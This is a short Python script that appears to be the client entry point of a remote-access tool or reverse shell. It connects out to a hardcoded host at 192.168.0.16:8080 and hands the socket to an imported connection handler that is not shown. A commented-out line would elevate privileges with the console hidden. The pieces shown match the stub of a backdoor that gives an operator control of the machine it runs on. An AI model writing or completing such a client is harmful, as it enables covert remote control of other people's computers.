from core.connection.connection import *
from core.connection.handler import  handleConnection
from elevate import elevate

if __name__ == "__main__":
    #elevate(show_console=False)
    my_socket = ClientConnection()
    print("[+] Waiting for connection")
    my_socket.Connect("192.168.0.16", 8080)
    print("[+] Connected ")
    handleConnection(my_socket)
    my_socket.Close()